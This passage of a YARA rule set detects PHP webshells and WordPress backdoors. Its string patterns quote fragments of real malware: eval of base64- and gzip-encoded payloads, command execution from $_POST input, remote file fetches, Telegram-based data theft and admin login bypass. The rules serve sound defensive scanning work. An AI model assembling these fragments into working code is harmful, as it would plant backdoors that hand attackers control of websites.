        $trigger = "class mbd_"
    condition:
        $trigger and PR03637
}

private rule PR03638 : trigger
{
    strings:
        $ps0 = "echo@null;goto"
    condition:
        $ps0
}

rule php_backdoor_webshell_340 : backdoor
{
    strings:
        $trigger = "))));@null"
    condition:
        $trigger and PR01350 and PR03638
}

private rule PR03639 : trigger
{
    strings:
        $ps0 = "Jy5tZDUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKS4nLnBocCddO"
    condition:
        $ps0
}

rule php_backdoor_webshell_341 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR01398 and PR03639
}

private rule PR03640 : trigger
{
    strings:
        $ps0 = "IH0gZXZhbCh"
    condition:
        $ps0
}

rule php_backdoor_webshell_342 : backdoor
{
    strings:
        $trigger = "ZXJyb3JfcmVwb3J"
    condition:
        $trigger and PR03640
}

private rule PR03641 : trigger
{
    strings:
        $ps0 = "file_put_contents(created_file()"
    condition:
        $ps0
}

private rule PR03642 : trigger
{
    strings:
        $ps0 = "urlencode(base64_encode(gzencode(json_encode("
    condition:
        $ps0
}

rule php_backdoor_webshell_343 : backdoor
{
    strings:
        $trigger = "touch($"
    condition:
        $trigger and PR03641 and PR00341 and PR03642
}

rule php_backdoor_webshell_344 : backdoor
{
    strings:
        $trigger = "base64_decode(base64_decode(\"UUdsdWFWOXpaWFFvSj"
    condition:
        $trigger and PR00029 and PR01658
}

private rule PR03643 : trigger
{
    strings:
        $ps0 = "(file_exists(\"/usr/bin/wget"
    condition:
        $ps0
}

rule php_backdoor_webshell_345 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02458 and PR00507 and PR02460 and PR03643
}

private rule PR03644 : trigger
{
    strings:
        $ps0 = "$this->loggedOn=@ftp_login"
    condition:
        $ps0
}

rule php_backdoor_webshell_346 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR03644 and PR01021 and PR02723
}

private rule PR03645 : trigger
{
    strings:
        $ps0 = "exec('cmd.exe"
    condition:
        $ps0
}

rule php_backdoor_webshell_347 : backdoor
{
    strings:
        $trigger = "isset($_POST["
    condition:
        $trigger and PR02448 and PR03645
}

private rule PR03646 : trigger
{
    strings:
        $ps0 = "substr(decoct(fileperms($"
    condition:
        $ps0
}

rule php_backdoor_webshell_348 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR03646 and PR00357 and PR02033
}

private rule PR03647 : trigger
{
    strings:
        $ps0 = "md5(trim($_POST["
    condition:
        $ps0
}

rule php_backdoor_webshell_349 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR03647 and PR00029 and PR02442
}

private rule PR03648 : trigger
{
    strings:
        $ps0 = "M1N1 SH3LL"
    condition:
        $ps0
}

rule php_backdoor_webshell_350 : backdoor
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR03648 and PR02951
}

rule php_backdoor_webshell_351 : backdoor
{
    strings:
        $trigger = "STDERR: $!\\n\";exec(\"' . $v . '\") or die\"$f Run shell"
    condition:
        $trigger and PR00042 and PR00046 and PR00251
}

private rule PR03649 : trigger
{
    strings:
        $ps0 = "whoami;echo;tail"
    condition:
        $ps0
}

rule php_backdoor_webshell_352 : backdoor
{
    strings:
        $trigger = "fopen("
    condition:
        $trigger and PR01543 and PR01403 and PR01479 and PR03649 and PR02357
}

rule php_backdoor_webshell_353 : backdoor
{
    strings:
        $trigger = "])){@eval($_REQUEST["
    condition:
        $trigger and PR01431 and PR02141 and PR01021
}

private rule PR03650 : trigger
{
    strings:
        $ps0 = "strlen($"
    condition:
        $ps0
}

rule php_backdoor_webshell_354 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR01653 and PR03039 and PR03650
}

private rule PR03651 : trigger
{
    strings:
        $ps0 = ".= chr(hexdec($"
    condition:
        $ps0
}

private rule PR03652 : trigger
{
    strings:
        $ps0 = "]('\\\\', '/', $"
    condition:
        $ps0
}

rule php_backdoor_webshell_356 : backdoor
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00046 and PR03651 and PR03652
}

private rule PR03653 : trigger
{
    strings:
        $ps0 = "if(get_magic_quotes_gpc()){foreach($_POST as${${"
    condition:
        $ps0
}

rule php_backdoor_webshell_357 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03653 and PR02458 and PR02460
}

private rule PR03654 : trigger
{
    strings:
        $ps0 = "='f'.'u'.'c'.'k'."
    condition:
        $ps0
}

rule php_backdoor_webshell_358 : backdoor
{
    strings:
        $trigger = "[] = base64_decode($Array[$i]);"
    condition:
        $trigger and PR03654 and PR00029
}

private rule PR03655 : trigger
{
    strings:
        $ps0 = "QHpmIPXMGQAEFoKCBQonJISwlREGrSqD"
    condition:
        $ps0
}

rule php_backdoor_webshell_359 : backdoor
{
    strings:
        $trigger = "\"\\x62\\x61\\x73\\x65\\x36\\x34\\x5"
    condition:
        $trigger and PR03655 and PR00029
}

rule php_backdoor_webshell_360 : backdoor
{
    strings:
        $trigger = "xVhtb9tGEv6sAv0Pa0Y1pdYiJ"
    condition:
        $trigger and PR01350
}

rule php_backdoor_webshell_361 : backdoor
{
    strings:
        $trigger = "->set_chmod(base64_decode($_POST["
    condition:
        $trigger and PR01726 and PR00046
}

rule php_backdoor_webshell_362 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR00046 and PR02460 and PR03148 and PR01021 and PR02769
}

private rule PR03656 : trigger
{
    strings:
        $ps0 = "unpack('S', gzread($"
    condition:
        $ps0
}

rule php_backdoor_webshell_363 : backdoor
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR01021 and PR03656 and PR01569 and PR01431
}

private rule PR03657 : trigger
{
    strings:
        $ps0 = "gzinflate"
    condition:
        $ps0
}

rule php_backdoor_webshell_364 : backdoor
{
    strings:
        $trigger = "base64_decode($_REQUEST["
    condition:
        $trigger and PR00732 and PR03657 and PR01765
}

private rule PR03658 : trigger
{
    strings:
        $ps0 = "github.io/MARIJUANA"
    condition:
        $ps0
}

rule php_backdoor_webshell_365 : backdoor
{
    strings:
        $trigger = "mail"
    condition:
        $trigger and PR00091 and PR00341 and PR00342 and PR03658
}

private rule PR03659 : trigger
{
    strings:
        $ps0 = "function getOwner"
    condition:
        $ps0
}

private rule PR03660 : trigger
{
    strings:
        $ps0 = "elseif(!is_readable($"
    condition:
        $ps0
}

rule php_backdoor_webshell_366 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR03659 and PR00046 and PR03660 and PR03148 and PR01021 and PR02769
}

private rule PR03661 : trigger
{
    strings:
        $ps0 = "JFpZWllZWT0iRXh5VUhhWE5jWmhx"
    condition:
        $ps0
}

rule php_backdoor_webshell_367 : backdoor
{
    strings:
        $trigger = "null;$"
    condition:
        $trigger and PR01350 and PR03661
}

rule php_backdoor_webshell_368 : backdoor
{
    strings:
        $trigger = "@fopen('.htaccess"
    condition:
        $trigger and PR01458
}

rule php_backdoor_webshell_371 : backdoor
{
    strings:
        $trigger = "JFpZWllZWT0iRXh5VUhhWE5jWmhxTW16b1NGZ2Vyd"
    condition:
        $trigger and PR01350
}

rule php_backdoor_webshell_372 : backdoor
{
    strings:
        $trigger = "U7MTc1OzI0MjsxMzA7MTMzOzI0MjsxNzU7Iik7JHo9IiI7Zm9yZWFjaCgkbSBhcyAkdilpZiAoJHYhPSIiKSR6Lj1jaHIoJHZeJGspO2V2YWwoJHopOw=="
    condition:
        $trigger and PR00719
}

rule php_backdoor_webshell_373 : backdoor
{
    strings:
        $trigger = "==>fail</br>\";"
    condition:
        $trigger and PR00435 and PR00341 and PR01539
}

rule php_backdoor_webshell_374 : backdoor
{
    strings:
        $trigger = "7ZLRjppAFIZfwCZ9h8mGhCFNseq23Spa1EgQ"
    condition:
        $trigger and PR01350
}

private rule PR03662 : trigger
{
    strings:
        $ps0 = "PGZvcm0gYWN0aW9uPS"
    condition:
        $ps0
}

rule php_backdoor_webshell_375 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR01392 and PR03662 and PR00357
}

private rule PR03663 : trigger
{
    strings:
        $ps0 = "error_reporting(\"\\0\\0\\17\\3\\30\");"
    condition:
        $ps0
}

rule php_backdoor_webshell_376 : backdoor
{
    strings:
        $trigger = "= gzcompress(\"if(!is_writable('{$"
    condition:
        $trigger and PR01818 and PR00029 and PR00507 and PR03663
}

private rule PR03664 : trigger
{
    strings:
        $ps0 = "echo \"Filezip : $file"
    condition:
        $ps0
}

private rule PR03665 : trigger
{
    strings:
        $ps0 = "=['/https:\\/\\/api\\.telegram\\.org\\/bot(.*)\\/SendMessage/','$token="
    condition:
        $ps0
}

rule php_backdoor_webshell_377 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03664 and PR03665
}

rule php_backdoor_webshell_378 : backdoor
{
    strings:
        $trigger = ".txt', date('Y-m-d H:i:s').'::'.$_SERVER['REMOTE_ADDR'].'::'.json_encode($_POST)."
    condition:
        $trigger and PR00435
}

private rule PR03666 : trigger
{
    strings:
        $ps0 = ",htmlentities(file_get_contents($"
    condition:
        $ps0
}

rule php_backdoor_webshell_379 : backdoor
{
    strings:
        $trigger = "($_POST["
    condition:
        $trigger and PR00046 and PR01468 and PR03666
}

private rule PR03667 : trigger
{
    strings:
        $ps0 = "ZGlybmFtZS"
    condition:
        $ps0
}

rule php_backdoor_webshell_380 : backdoor
{
    strings:
        $trigger = "md5("
    condition:
        $trigger and PR00046 and PR01330 and PR03667
}

private rule PR03668 : trigger
{
    strings:
        $ps0 = "$_POST['cmd"
    condition:
        $ps0
}

private rule PR03669 : trigger
{
    strings:
        $ps0 = "shell_exec"
    condition:
        $ps0
}

rule php_backdoor_webshell_381 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01021 and PR03668 and PR03669
}

private rule PR03670 : trigger
{
    strings:
        $ps0 = "== 'ENCODE' ? str_replace('=', '', $"
    condition:
        $ps0
}

rule php_backdoor_webshell_383 : backdoor
{
    strings:
        $trigger = "strre"
    condition:
        $trigger and PR01488 and PR03670
}

// MANUAL FIX NECESSARY
rule php_backdoor_webshell_384 : backdoor
{
    strings:
        $trigger = "onfr64_qrpbqr"
        $php_backdoor_webshell_384_r0 = /=str_rot13\([^;]+fge_ebg13[^;]+;\$/
    condition:
        $trigger and PR01372 and $php_backdoor_webshell_384_r0
}

private rule PR03671 : trigger
{
    strings:
        $ps0 = "JFRDVENDQz0iVEVRVnNKUklnS0"
    condition:
        $ps0
}

rule php_backdoor_webshell_385 : backdoor
{
    strings:
        $trigger = "null;$"
    condition:
        $trigger and PR01350 and PR03671
}

private rule PR03672 : trigger
{
    strings:
        $ps0 = "(@symlink(realpath(ft_get_dir"
    condition:
        $ps0
}

rule php_backdoor_webshell_386 : backdoor
{
    strings:
        $trigger = "md5("
    condition:
        $trigger and PR00046 and PR01330 and PR03672
}

private rule PR03673 : trigger
{
    strings:
        $ps0 = "DBMUzyFoRkGxlnZJIZh1"
    condition:
        $ps0
}

rule php_backdoor_webshell_387 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR03673 and PR00029
}

private rule PR03674 : trigger
{
    strings:
        $ps0 = "if (md5($_POST['password']) == $password) {"
    condition:
        $ps0
}

private rule PR03675 : trigger
{
    strings:
        $ps0 = "<html><head><title> </title></head>"
    condition:
        $ps0
}

rule php_backdoor_webshell_388 : backdoor
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR03674 and PR00046 and PR03675
}

private rule PR03676 : trigger
{
    strings:
        $ps0 = "@file_put_contents($so_path , pack('H*' , $file_code));"
    condition:
        $ps0
}

private rule PR03677 : trigger
{
    strings:
        $ps0 = "<script>function submitUrl(){document.getElementById('command')"
    condition:
        $ps0
}

rule php_backdoor_webshell_389 : backdoor
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR03676 and PR00281 and PR03677
}

private rule PR03678 : trigger
{
    strings:
        $ps0 = "define('Viv, bebegim.','');"
    condition:
        $ps0
}

private rule PR03679 : trigger
{
    strings:
        $ps0 = "header(\"status: 404 Not Found\");"
    condition:
        $ps0
}

rule php_backdoor_webshell_390 : backdoor
{
    strings:
        $trigger = "= new me;"
    condition:
        $trigger and PR03678 and PR00029 and PR01623 and PR03679
}

private rule PR03680 : trigger
{
    strings:
        $ps0 = "WlhaaGJDVXlPQ1V5Tm5GMWIzUWxNMElsTTBZbE1qWm5kQ1V6UWlV"
    condition:
        $ps0
}

rule php_backdoor_webshell_391 : backdoor
{
    strings:
        $trigger = "0O"
    condition:
        $trigger and PR00029 and PR01422 and PR03680
}

rule php_backdoor_webshell_392 : backdoor
{
    strings:
        $trigger = "JFRDVENDQz0ickhkQkljUEtGYm1Ha3VPaH"
    condition:
        $trigger and PR01350
}

// MANUAL FIX NECESSARY
private rule PR03681 : trigger
{
    strings:
        $ps0 = ",GLOB_ONLYDIR);if(in_array("
    condition:
        $ps0
}

rule php_backdoor_webshell_393 : backdoor
{
    strings:
        $trigger = "file_get_contents"
        $php_backdoor_webshell_393_r0 = /file_get_contents\(.http/
    condition:
        $trigger and PR00355 and PR03681 and PR00357 and $php_backdoor_webshell_393_r0
}

private rule PR03682 : trigger
{
    strings:
        $ps0 = "New Smtp Uploaded"
    condition:
        $ps0
}

rule php_backdoor_webshell_394 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03682 and PR00355 and PR02206 and PR00357
}

private rule PR03683 : trigger
{
    strings:
        $ps0 = "null;$"
    condition:
        $ps0
}

rule php_backdoor_webshell_395 : backdoor
{
    strings:
        $trigger = "Xb1bsy3JcpX5VzCsH"
    condition:
        $trigger and PR01350 and PR03683
}

rule php_backdoor_webshell_396 : backdoor
{
    strings:
        $trigger = "CiBnb3RvIEN6RWVCOyBtQjVO"
    condition:
        $trigger and PR01398
}

private rule PR03684 : trigger
{
    strings:
        $ps0 = "JFRDVENDQz0iWUJzR2FjaHF"
    condition:
        $ps0
}

rule php_backdoor_webshell_397 : backdoor
{
    strings:
        $trigger = "null;$"
    condition:
        $trigger and PR01350 and PR03684
}

rule php_backdoor_webshell_398 : backdoor
{
    strings:
        $trigger = "Lundw1NKa0omg7j0xI8q687ztCyGywrndf13PzCfDav5w3dqOl6YaE2n87VDb2Qr+UMLZFKdR"
    condition:
        $trigger and PR00675
}

rule php_backdoor_webshell_gen_003 : backdoor
{
    strings:
        $trigger = "Web Shell By SultanHaikal"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_004 : backdoor
{
    strings:
        $trigger = "FaTaLisTiCz_Fx"
    condition:
        $trigger and PR00013
}

rule php_backdoor_webshell_gen_005 : backdoor
{
    strings:
        $trigger = "Web Shell by boff"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_006 : backdoor
{
    strings:
        $trigger = "Web Shell by oRb"
    condition:
        $trigger
}

private rule PR03685 : trigger
{
    strings:
        $ps0 = "- Sh3ll - By "
    condition:
        $ps0
}

rule php_backdoor_webshell_gen_007 : backdoor
{
    strings:
        $trigger = "hell"
    condition:
        $trigger and PR03685
}

rule php_backdoor_webshell_gen_008 : backdoor
{
    strings:
        $trigger = "Loader'z WEB Shell"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_010 : backdoor
{
    strings:
        $trigger = "private shell by x0r"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_011 : backdoor
{
    strings:
        $trigger = "shell created by evilc0ders"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_012 : backdoor
{
    strings:
        $trigger = "/need shell coder"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_013 : backdoor
{
    strings:
        $trigger = "Do not Distibute This shell"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_016 : backdoor
{
    strings:
        $trigger = "PHP Shell by Stoner"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_022 : backdoor
{
    strings:
        $trigger = "$_COOKIE[$cookiename] != $passw"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_023 : backdoor
{
    strings:
        $trigger = "<title>SimAttacker"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_024 : backdoor
{
    strings:
        $trigger = "\"/tmp/tmp-server\""
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_025 : backdoor
{
    strings:
        $trigger = "<title>--==[[ Don,Symlink Based Cpanel Cracker By Team IndiShell]]==--</title>"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_027 : backdoor
{
    strings:
        $trigger = ">ZaraByte File Uploader"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_030 : backdoor
{
    strings:
        $trigger = "print \"<tr><td><b>wtf:</b></td><td>$UserID</td></tr>\";"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_038 : backdoor
{
    strings:
        $trigger = "NoGe S!mPLe SHeLL"
    condition:
        $trigger and PR00042
}

rule php_backdoor_webshell_gen_039 : backdoor
{
    strings:
        $trigger = "@move_uploaded_file($tmp_name, $security"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_040_02 : backdoor
{
    strings:
        $trigger = "file_put_contents(\"../wp-config.php\",$"
    condition:
        $trigger and PR01648
}

rule php_backdoor_webshell_gen_041 : backdoor
{
    strings:
        $trigger = "@error_reporting(0); if (!isset($eva"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_042 : backdoor
{
    strings:
        $trigger = ";$z=get_option(\"_site"
    condition:
        $trigger and PR01483
}

rule php_backdoor_webshell_gen_043 : backdoor
{
    strings:
        $trigger = "$z=get_option(\"_site"
    condition:
        $trigger and PR01483
}

rule php_backdoor_webshell_gen_044 : backdoor
{
    strings:
        $trigger = "eval(@gzinflate(base64_decode("
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_046 : backdoor
{
    strings:
        $trigger = "$zend_framework=\"\\x63\\162"
    condition:
        $trigger and PR01837
}

rule php_backdoor_webshell_gen_048 : backdoor
{
    strings:
        $trigger = "$a = array('v','e',')','b','s','c','l',\"z\",\"r\",'o',\"a\",'$',';','i','t',\"n\",'_',\"f\",'6',\"g\",\"4\",\"d\",'(');"
    condition:
        $trigger and PR01483
}

// MANUAL FIX NECESSARY
rule php_backdoor_webshell_gen_049 : backdoor
{
    strings:
        $trigger = "eval(\"?>\".gzuncompress(base64_decode("
        $php_backdoor_webshell_gen_049_r0 = /eval.....\.gzuncompress.base64_decode[^;]+;/
    condition:
        $trigger and $php_backdoor_webshell_gen_049_r0
}

rule php_backdoor_webshell_gen_050 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('rVdtc"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_051 : backdoor
{
    strings:
        $trigger = "function fteil_macros"
    condition:
        $trigger and PR00029
}

rule php_backdoor_webshell_gen_052 : backdoor
{
    strings:
        $trigger = "aWYoaXNzZXQoJF9HRVRbJ2tsaXZlcnonXSkpew0KDQplY2hvICc8Y2VudGVyPjxiPis"
    condition:
        $trigger and PR00029
}

rule php_backdoor_webshell_gen_053 : backdoor
{
    strings:
        $trigger = "= \"\\x65\\x76al(\\x67\\x7a\\x69nf\\x6ca\\x74e(b\\x61se6\\x34\\x5f\\x64\\x65cod\\x65(\\x27\";"
    condition:
        $trigger
}

private rule PR03686 : trigger
{
    strings:
        $ps0 = "$v2045f746 = array(\"Google\""
    condition:
        $ps0
}

rule php_backdoor_webshell_gen_054 : backdoor
{
    strings:
        $trigger = "@chmod($_POST"
    condition:
        $trigger and PR03686
}

rule php_backdoor_webshell_gen_055 : backdoor
{
    strings:
        $trigger = "}eval(SED(\"7b37exvHkSj6O/VXjBFG"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_058 : backdoor
{
    strings:
        $trigger = "echo \"check PHP version... \" . phpversion() . \" -------- OK!<br>\\n\" ;"
    condition:
        $trigger and PR00042 and PR00046
}

rule php_backdoor_webshell_gen_059 : backdoor
{
    strings:
        $trigger = "(Web Shell By Black-ID"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_060 : backdoor
{
    strings:
        $trigger = "$currentCMD = str_replace(\"\\\\\",\"\\\",$_POST['_cmd']);"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_062 : backdoor
{
    strings:
        $trigger = "function lovesetcookie("
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_063 : backdoor
{
    strings:
        $trigger = "function actionInfect() {"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_064 : backdoor
{
    strings:
        $trigger = "// Skullv1 Shell"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_066 : backdoor
{
    strings:
        $trigger = "echo htmlspecialchars(implode('', file($_POST['file'])));"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_067 : backdoor
{
    strings:
        $trigger = "echo \"<br>[CGI] => CHMOD To 755 Complate !\";"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_068 : backdoor
{
    strings:
        $trigger = "$shellPath = pathinfo($_SERVER['REQUEST_URI'], PATHINFO_DIRNAME);"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_069 : backdoor
{
    strings:
        $trigger = "echo '<a style=\"'.(is_file($file)?$style1:$style2)."
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_071 : backdoor
{
    strings:
        $trigger = "=> '1nj3c7 Sh311' ,"
    condition:
        $trigger and PR00732
}

rule php_backdoor_webshell_gen_072 : backdoor
{
    strings:
        $trigger = "PHP Shell 2.0"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_073 : backdoor
{
    strings:
        $trigger = "file_put_contents('cacheplugin.php', file_get_contents('http://"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_074 : backdoor
{
    strings:
        $trigger = "setcookie('password', SHELL_PASSWORD, time()"
    condition:
        $trigger
}

private rule PR03687 : trigger
{
    strings:
        $ps0 = "define('PHPSHELL_VERSION', '1.7');"
    condition:
        $ps0
}

rule php_backdoor_webshell_gen_075 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR03687
}

rule php_backdoor_webshell_gen_076 : backdoor
{
    strings:
        $trigger = "define('PHPSHELL_VERSION', '"
    condition:
        $trigger and PR00013
}

rule php_backdoor_webshell_gen_077 : backdoor
{
    strings:
        $trigger = "system(\"$cmd 1> /tmp/cmdline 2>&1; cat /tmp/cmdline; rm /tmp/cmdline\");"
    condition:
        $trigger
}

private rule PR03688 : trigger
{
    strings:
        $ps0 = "chk7 = document.getElementById('pchk-7');"
    condition:
        $ps0
}

rule php_backdoor_webshell_gen_078 : backdoor
{
    strings:
        $trigger = "move_uploaded_file"
    condition:
        $trigger and PR03688
}

private rule PR03689 : trigger
{
    strings:
        $ps0 = "(strrev('/0///973"
    condition:
        $ps0
}

rule php_backdoor_webshell_gen_079 : backdoor
{
    strings:
        $trigger = "onfr64_qrpbqr"
    condition:
        $trigger and PR03689 and PR01372
}

private rule PR03690 : trigger
{
    strings:
        $ps0 = "$html = @file_get_contents($webshell,"
    condition:
        $ps0
}

rule php_backdoor_webshell_gen_080 : backdoor
{
    strings:
        $trigger = "@$data=str_replace(\"base64_decode"
    condition:
        $trigger and PR03690
}

rule php_backdoor_webshell_gen_081 : backdoor
{
    strings:
        $trigger = "$command = trim(str_replace($config_command_prefix"
    condition:
        $trigger and PR00013
}

rule php_backdoor_webshell_gen_082 : backdoor
{
    strings:
        $trigger = "<title>_DOG Of War_</title>"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_083 : backdoor
{
    strings:
        $trigger = "<title>-farM-mOn3Y-</title>"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_084 : backdoor
{
    strings:
        $trigger = "file_put_contents('../index'. '.' . $"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_085 : backdoor
{
    strings:
        $trigger = "eval(base64_decode(\"JGFyclswXT0iQ2lSaGRYUm9JRDBnSW"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_34 : backdoor
{
    strings:
        $trigger = "fputs($f,$shell);"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_36 : backdoor
{
    strings:
        $trigger = "exec('cd /tmp;"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_37 : backdoor
{
    strings:
        $trigger = "http://shorthere.com/"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_38 : backdoor
{
    strings:
        $trigger = ");eval(\"?>\".$x);"
    condition:
        $trigger
}

rule php_backdoor_webshell_gen_39 : backdoor
{
    strings:
        $trigger = "Purple666"
    condition:
        $trigger and PR00013
}

// MANUAL FIX NECESSARY
rule php_backdoor_webshell_gen_41 : backdoor
{
    strings:
        $trigger = "CURL"
        $php_backdoor_webshell_gen_41_r0 = /function[\s]*[\w]+\(\$[\w]+\)\{[^\}]+\}[\s]*[^;]+\$[\w][\s]*=[\s]*get_contents\(.http[^;]+\);[\s]*eval\(.\?>.\.\$[\w]*\);/
    condition:
        $trigger and $php_backdoor_webshell_gen_41_r0
}

private rule PR03691 : trigger
{
    strings:
        $ps0 = "gcc -o bcc bcc.c"
    condition:
        $ps0
}

private rule PR03692 : trigger
{
    strings:
        $ps0 = "@posix_getpwuid(@fileowner($folder));"
    condition:
        $ps0
}

rule php_backdoor_webshell_gen_42 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03691 and PR00355 and PR01392 and PR03692 and PR00357
}

private rule PR03693 : trigger
{
    strings:
        $ps0 = "if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 .\""
    condition:
        $ps0
}

rule php_backdoor_webshell_group_001 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03693
}

rule php_backdoor_whcms_killer_001 : backdoor
{
    strings:
        $trigger = "header('WWW-Authenticate: Basic realm=\"Powered By RAB3OUN\"');"
    condition:
        $trigger and PR00265
}

private rule PR03694 : trigger
{
    strings:
        $ps0 = "$url = \"http://wordpresscore.com/plugins/"
    condition:
        $ps0
}

rule php_backdoor_wordpresscore_001 : backdoor
{
    strings:
        $trigger = "POST"
    condition:
        $trigger and PR03694
}

private rule PR03695 : trigger
{
    strings:
        $ps0 = "require_once('includes/CCTM_Communicator.php')"
    condition:
        $ps0
}

private rule PR03696 : trigger
{
    strings:
        $ps0 = "$_objCCTMCom->addInfo(array($user_login"
    condition:
        $ps0
}

rule php_backdoor_wordpresscore_002 : backdoor
{
    strings:
        $trigger = "$_objCCTMCom = new CCTM_Communicator();"
    condition:
        $trigger and PR03695 and PR03696 and PR02092
}

rule php_backdoor_wordpresscore_002_02 : backdoor
{
    strings:
        $trigger = "$_objCCTMCom = new CCTM_Communicator();"
    condition:
        $trigger and PR03695 and PR02092
}

rule php_backdoor_wordpresscore_002_03 : backdoor
{
    strings:
        $trigger = "require_once('includes/CCTM_Communicator.php');"
    condition:
        $trigger and PR02092
}

private rule PR03697 : trigger
{
    strings:
        $ps0 = "if (!class_exists('CCTM_Communicator')) {"
    condition:
        $ps0
}

rule php_backdoor_wordpresscore_003 : backdoor
{
    strings:
        $trigger = "CURL"
    condition:
        $trigger and PR03697
}

private rule PR03698 : trigger
{
    strings:
        $ps0 = "//****Start****/"
    condition:
        $ps0
}

rule php_backdoor_wordpresscore_004 : backdoor
{
    strings:
        $trigger = "wordpresscore.com"
    condition:
        $trigger and PR03698 and PR00507
}

private rule PR03699 : trigger
{
    strings:
        $ps0 = "if($redirect_to == 'wp-admin/'"
    condition:
        $ps0
}

private rule PR03700 : trigger
{
    strings:
        $ps0 = "'u'=>esc_attr(wp_unslash($_POST['log'])),"
    condition:
        $ps0
}

rule php_backdoor_wordpresscore_005 : backdoor
{
    strings:
        $trigger = "wordpresscore.com"
    condition:
        $trigger and PR03699 and PR03700
}

private rule PR03701 : trigger
{
    strings:
        $ps0 = "wordpresscore.com"
    condition:
        $ps0
}

rule php_backdoor_wordpresscore_005_02 : backdoor
{
    strings:
        $trigger = "if(isset($_POST['log']) && !empty($_POST['log']))"
    condition:
        $trigger and PR03700 and PR03701
}

private rule PR03702 : trigger
{
    strings:
        $ps0 = "function get_file_name($path)"
    condition:
        $ps0
}

rule php_backdoor_wordpresscore_006 : backdoor
{
    strings:
        $trigger = "$jm_code"
    condition:
        $trigger and PR00435 and PR03702
}

private rule PR03703 : trigger
{
    strings:
        $ps0 = "if (method_exists(\"wordfenceHash\", \"wfHash\""
    condition:
        $ps0
}

private rule PR03704 : trigger
{
    strings:
        $ps0 = "if ($destination_name == \"wordfence\" && ($data = file_get_contents($file = $destination"
    condition:
        $ps0
}

rule php_backdoor_wordpresscore_007 : backdoor
{
    strings:
        $trigger = "@unlink($working_dir . \"/wordpress/wp-admin/includes/class-wp-upgrader"
    condition:
        $trigger and PR00435 and PR03703 and PR03704
}

rule php_backdoor_wordpresscore_007_02 : backdoor
{
    strings:
        $trigger = "@unlink($working_dir . \"/wordpress/wp-admin/includes/class-wp-upgrader"
    condition:
        $trigger and PR00435 and PR03704
}

private rule PR03705 : trigger
{
    strings:
        $ps0 = "wp_set_auth_cookie($id)"
    condition:
        $ps0
}

private rule PR03706 : trigger
{
    strings:
        $ps0 = "$id = $_GET['id']"
    condition:
        $ps0
}

rule php_backdoor_wpadmin_bypass_004 : backdoor
{
    strings:
        $trigger = "/wp-load.php';"
    condition:
        $trigger and PR03705 and PR03706 and PR02534
}

private rule PR03707 : trigger
{
    strings:
        $ps0 = "administrator"
    condition:
        $ps0
}

private rule PR03708 : trigger
{
    strings:
        $ps0 = "wp_set_current_user($"
    condition:
        $ps0
}

rule php_backdoor_wpadmin_bypass_005 : backdoor
{
    strings:
        $trigger = "if (preg_match($keywordsRegex"
    condition:
        $trigger and PR00039 and PR03707 and PR03708
}

private rule PR03709 : trigger
{
